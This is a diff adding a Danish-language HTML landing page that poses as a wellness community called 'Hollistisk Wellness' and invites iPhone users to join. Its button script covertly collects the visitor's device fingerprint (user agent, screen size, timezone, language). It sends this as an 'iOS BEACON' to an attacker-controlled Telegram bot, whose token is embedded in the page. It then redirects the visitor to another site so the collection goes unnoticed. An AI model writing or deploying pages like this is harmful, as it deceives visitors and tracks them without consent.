@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Hollistisk Wellness</title>
+    <style>
+        /* Same styling as Android version */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+        }
+        .container { max-width: 400px; margin: 0 auto; text-align: center; }
+        .logo { font-size: 48px; margin: 20px 0; }
+        .title { font-size: 24px; margin: 20px 0; }
+        .join-btn {
+            background: white;
+            color: #667eea;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 20px 0;
+            cursor: pointer;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🧘‍♀️</div>
+        <div class="title">Hollistisk Wellness</div>
+        <div>Eksklusive wellness resources til iPhone brugere</div>
+        <button class="join-btn" onclick="joinIOS()">Deltag via iPhone ✨</button>
+    </div>
+
+    <script>
+        async function joinIOS() {
+            // iOS has very limited data collection capabilities
+            const iosData = {
+                source: 'hollistisk_ios',
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                screen: {
+                    width: screen.width,
+                    height: screen.height
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language
+            };
+            
+            // Send basic beacon
+            try {
+                await fetch('https://api.telegram.org/bot8283973635:AAFzNIcEl78aH-l0iKj5lYKFLj4Vil39u7k/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: '3032183658',
+                        text: '📱 iOS BEACON (Limited):\n```json\n' + JSON.stringify(iosData, null, 2) + '\n```',
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch(e) {
+                console.log('Failed to send beacon');
+            }
+            
+            // iOS: Try to add to home screen (PWA)
+            alert('Tilføj til hjemmeskærm for den bedste oplevelse!');
+            
+            // Redirect to legitimate site
+            setTimeout(() => {
+                window.location.href = 'https://minfulness.dk';
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
